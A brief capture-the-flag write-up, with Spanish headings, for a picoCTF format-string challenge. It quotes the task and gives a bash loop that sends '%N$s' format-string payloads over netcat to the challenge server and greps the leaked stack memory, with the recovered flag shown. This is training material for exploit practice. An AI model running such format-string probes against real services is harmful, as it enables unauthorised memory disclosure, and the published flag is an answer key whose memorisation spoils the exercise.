## Objetivo
Story telling class 1/2 I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/91/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/91/vuln.c). And connect with it using: `nc saturn.picoctf.net 55619`

## Solución
```bash
┌──(kali㉿kali)-[~/picoCTFretos/Binexp/flagleak]
└─$ for i in {0..1500}; do echo "%$i\$s" | nc saturn.picoctf.net 53744 | grep -Ei "L34k|pico" ; done
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
FLAG=picoCTF{L34k1ng_Fl4g_0ff_St4ck_
```
